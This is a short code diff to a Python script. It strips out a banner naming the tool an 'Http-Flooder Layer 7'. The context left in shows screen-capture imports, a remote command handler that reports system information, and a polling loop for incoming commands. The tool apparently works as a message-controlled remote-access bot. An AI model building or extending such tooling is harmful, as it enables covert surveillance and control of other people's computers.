@@ -4,19 +4,6 @@ import requests
 import subprocess
 import time
 
-def banner():
-    print()
-    print("""  \t \t\033[93m───▄▀▀▀▀▀───▄█▀▀▀█▄
-\t──▐▄▄▄▄▄▄▄▄██▌▀▄▀▐██
-\033[91m\t──▐▒▒▒▒▒▒▒▒███▌▀▐██\033[93m█\t [\033[36m*\033[93m]  \033[36mHttp-Flooder Layer 7
-\033[92m\t───▌▒▓▒▒▒▒▓▒██▌▀▐██
-\033[95m\t───▌▓▐▀▀▀▀▌▓─▀▀▀▀▀ 
-
-\t\033[36m[-] Dev :\033[36m Yesha Ex Dev""") 
-
-
-
-
 try:
     from PIL import ImageGrab
 except ImportError:
@@ -75,7 +62,6 @@ def execute_command(command):
             return 'Some shit occured'
     elif command == 'info':
         system_info = {
-        "——{ TERMINAL INFORMATION } ——"
         
             'Platform': platform.platform(),
             'System': platform.system(),
@@ -204,7 +190,7 @@ def main():
             offset = handle_updates(updates) + 1
             processed_message_ids.clear()
         else:
-            banner()
+      
             print("\033[36mPlease wait...")
 
 #coded by y3sh4 dont copy
